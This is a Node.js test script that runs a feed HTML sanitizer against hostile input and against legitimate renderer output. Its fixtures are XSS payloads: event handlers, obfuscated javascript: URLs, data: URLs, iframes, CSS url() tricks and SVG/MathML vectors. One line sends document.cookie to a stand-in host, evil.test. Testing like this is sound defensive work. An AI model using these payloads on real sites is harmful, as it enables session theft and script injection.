#!/usr/bin/env node
/**
 * The feed sanitizer, adversarially.
 *
 * A sanitizer is the one piece of code whose correctness cannot be established
 * by "the site still renders" — the input it exists to refuse is, by definition,
 * not the input the site produces. So this drives it directly, with the things
 * an attacker would try, and separately asserts that it is a NO-OP on the shape
 * the renderer actually emits. Both halves matter: a sanitizer that drops an
 * attack by dropping everything is not a sanitizer, it is an outage.
 *
 *   node --import ./scripts/auth/register-loader.mjs scripts/studio/sanitize-test.mjs
 */

const { sanitizeFeedHtml } = await import("../../src/lib/feed/sanitize.js");

let pass = 0;
const failures = [];

function ok(name, condition, detail = "") {
  if (condition) pass++;
  else failures.push(`${name}${detail ? ` — ${detail}` : ""}`);
}

/** Assert the output contains none of the given substrings. */
function refuses(name, html, forbidden) {
  const out = sanitizeFeedHtml(html);
  const found = forbidden.filter((needle) => out.includes(needle));
  ok(name, found.length === 0, `still present: ${found.join(", ")} | got ${out.slice(0, 200)}`);
}

/** Assert the output still contains the given substrings. */
function keeps(name, html, required) {
  const out = sanitizeFeedHtml(html);
  const missing = required.filter((needle) => !out.includes(needle));
  ok(name, missing.length === 0, `dropped: ${missing.join(", ")} | got ${out.slice(0, 200)}`);
}

// ── scripts ──────────────────────────────────────────────────────────────────
refuses(
  "a script element is removed",
  '<p>before</p><script>alert(1)</script><p>after</p>',
  ["<script", "alert(1)"]
);
keeps(
  "and the surrounding text survives",
  '<p>before</p><script>alert(1)</script><p>after</p>',
  ["before", "after"]
);

// ── event handlers, including the ones nobody thinks of ──────────────────────
for (const handler of [
  "onerror",
  "onload",
  "onclick",
  "onmouseover",
  "onfocus",
  "onanimationstart",
  "ontoggle",
]) {
  refuses(
    `${handler} is stripped`,
    `<img src="https://x.test/a.png" ${handler}="alert(1)" alt="x" />`,
    [handler, "alert(1)"]
  );
  refuses(
    `${handler} is stripped from a div`,
    `<div ${handler}="alert(1)">x</div>`,
    [handler]
  );
}

// ── javascript: URLs, in every spelling ──────────────────────────────────────
for (const href of [
  "javascript:alert(1)",
  "JavaScript:alert(1)",
  "java\tscript:alert(1)",
  "  javascript:alert(1)",
  "jav&#x09;ascript:alert(1)",
]) {
  refuses(
    `href ${JSON.stringify(href.slice(0, 18))} is dropped`,
    `<a href="${href}">click</a>`,
    ["javascript:", "alert(1)"]
  );
}

refuses(
  "a javascript: src on an image is dropped",
  '<img src="javascript:alert(1)" alt="x" />',
  ["javascript:"]
);

// ── data: URLs ───────────────────────────────────────────────────────────────
//
// `absolutize` passes `data:` through untouched, so a sanitizer that trusted the
// earlier pass would let this one out. The href goes, the link text stays.
refuses(
  "a data: href is dropped",
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  ["data:", "<script"]
);
keeps("the link text survives", '<a href="data:text/html,x">keepme</a>', ["keepme"]);

// ── iframes, objects, embeds, forms ──────────────────────────────────────────
refuses("an iframe is removed", '<iframe src="https://evil.test/"></iframe>', ["iframe"]);
refuses("an object is removed", '<object data="x"></object>', ["object"]);
refuses("an embed is removed", '<embed src="x" />', ["embed"]);
refuses("a form is removed", '<form action="https://evil.test/"><input name="a"></form>', [
  "<form",
  'action=',
]);
refuses(
  "an svg foreignObject is removed",
  '<svg><foreignObject><div>x</div></foreignObject></svg>',
  ["foreignObject", "foreignobject"]
);
refuses("a meta refresh is removed", '<meta http-equiv="refresh" content="0;url=x" />', ["meta"]);
refuses("a base is removed", '<base href="https://evil.test/" />', ["base"]);
refuses("a link is removed", '<link rel="stylesheet" href="x" />', ["<link"]);

// ── style: the sharp edge ────────────────────────────────────────────────────
refuses("url() in style is refused", '<p style="background:url(https://evil.test/x)">x</p>', [
  "url(",
]);
refuses("expression() in style is refused", '<p style="width:expression(alert(1))">x</p>', [
  "expression(",
]);
refuses(
  "a url() inside a custom property is refused",
  '<span style="--x:url(https://evil.test/x)">x</span>',
  ["url("]
);
refuses("position in style is refused", '<p style="position:fixed">x</p>', ["position"]);
refuses("< in style is refused", '<p style="color:red<">x</p>', ["color:red"]);

keeps(
  "a shiki colour survives",
  '<span style="--shiki-light:#A0A0A0;--shiki-dark:#EEFFFF">x</span>',
  ["--shiki-light:#A0A0A0", "--shiki-dark:#EEFFFF"]
);
keeps(
  "the display-math centring survives",
  '<p style="text-align:center;overflow-x:auto">x</p>',
  ["text-align:center", "overflow-x:auto"]
);
keeps("a font-style keyword survives", '<span style="--x:italic">x</span>', ["--x:italic"]);

// ── comments and processing instructions ─────────────────────────────────────
refuses(
  "an HTML comment is removed",
  '<p>a</p><!-- <script>alert(1)</script> --><p>b</p>',
  ["<!--", "<script"]
);

// ── markup the pipeline actually emits ───────────────────────────────────────
keeps(
  "MathML survives intact",
  '<math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi mathvariant="normal">a</mi><mo stretchy="false">+</mo><mn>1</mn></mrow></math>',
  ["<math", "<mi", "mathvariant", "stretchy", "<mn>"]
);
keeps(
  "a shiki pre keeps its class and tabindex",
  '<pre class="shiki shiki-themes material-theme-lighter" style="--shiki-light-bg:#FAFAFA" tabindex="0"><code>x</code></pre>',
  ["shiki", "shiki-themes", "--shiki-light-bg:#FAFAFA", "tabindex"]
);
keeps(
  "a figure keeps its image and caption",
  '<figure class="my-8"><img src="https://prologue.dev/static/images/x.png" alt="图表" width="720" /><figcaption class="text-center">说明</figcaption></figure>',
  ["<figure", 'class="my-8"', 'alt="图表"', "width", "<figcaption", "说明"]
);
keeps(
  "a footnote round trip survives",
  '<section data-footnotes class="footnotes"><sup><a href="https://x.test/#fn-1" id="fnref-1" data-footnote-ref aria-describedby="footnote-label">1</a></sup></section>',
  ["data-footnotes", "dataFootnoteRef".toLowerCase() === "" ? "" : "data-footnote-ref", "footnote-label"]
);
keeps(
  "a task-list checkbox survives, disabled",
  '<ul class="contains-task-list"><li class="task-list-item"><input type="checkbox" disabled> done</li></ul>',
  ["contains-task-list", 'type="checkbox"', "disabled", "done"]
);
keeps(
  "an SVG path survives with its geometry",
  '<svg xmlns="http://www.w3.org/2000/svg" width="400em" viewBox="0 0 400000 548" preserveAspectRatio="xMinYMin slice"><path d="M0 6l6-6h17" /></svg>',
  ["<svg", "viewBox", "preserveAspectRatio", `d="M0 6l6-6h17"`]
);

// ── the checkbox constraint ──────────────────────────────────────────────────
const hostileInput = sanitizeFeedHtml('<input type="text" name="password" />');
ok(
  "an input that is not a checkbox is neutralised",
  !hostileInput.includes("<input") && !hostileInput.includes("password"),
  hostileInput
);

// ── unwrapping ───────────────────────────────────────────────────────────────
keeps(
  "an unknown inline element is unwrapped, not deleted",
  "<p>a <mark>highlighted</mark> b</p>",
  ["highlighted", "a ", " b"]
);
refuses("and its tag is gone", "<p>a <mark>highlighted</mark> b</p>", ["<mark"]);

// ── the output is well-formed XML-shaped HTML ────────────────────────────────
const voided = sanitizeFeedHtml("<p>a<br>b</p><hr><img src=\"https://x.test/a.png\" alt=\"\">");
ok("void elements self-close", !/<br>|<hr>|<img [^>]*[^/]>/.test(voided), voided);

// ── a hostile document, end to end ───────────────────────────────────────────
const nasty = `
<p onclick="alert(1)">text</p>
<script>fetch('https://evil.test?c='+document.cookie)</script>
<img src=x onerror="alert(1)">
<a href="javascript:alert(2)">link</a>
<a href="data:text/html,<script>alert(3)</script>">link2</a>
<iframe srcdoc="<script>alert(4)</script>"></iframe>
<style>@import url('https://evil.test/x.css');</style>
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="alert(5)"></foreignObject></svg>
<form action="https://evil.test"><input type="submit" value="go"></form>
<div style="background:url(javascript:alert(6))">bg</div>
<math><mtext><img src=x onerror="alert(7)"></mtext></math>
`;
const cleaned = sanitizeFeedHtml(nasty);
const escapes = [
  "alert(", "onclick", "onerror", "javascript:", "data:", "https://evil.test",
  "<script", "<iframe", "<style", "foreignObject", "foreignobject", "<form",
  "srcdoc", "@import",
];
const leaked = escapes.filter((n) => cleaned.includes(n));
ok("nothing dangerous survives a mixed hostile document", leaked.length === 0, leaked.join(", "));
ok(
  "and the readable text is still there",
  cleaned.includes("text") && cleaned.includes("link") && cleaned.includes("bg"),
  cleaned.slice(0, 300)
);

console.log(`\nassertions: ${pass} passed, ${failures.length} failed`);
if (failures.length) {
  for (const f of failures) console.log(`\n  FAIL  ${f}`);
  process.exitCode = 1;
} else {
  console.log("OK — the sanitizer refuses what it must and keeps what it must.");
}
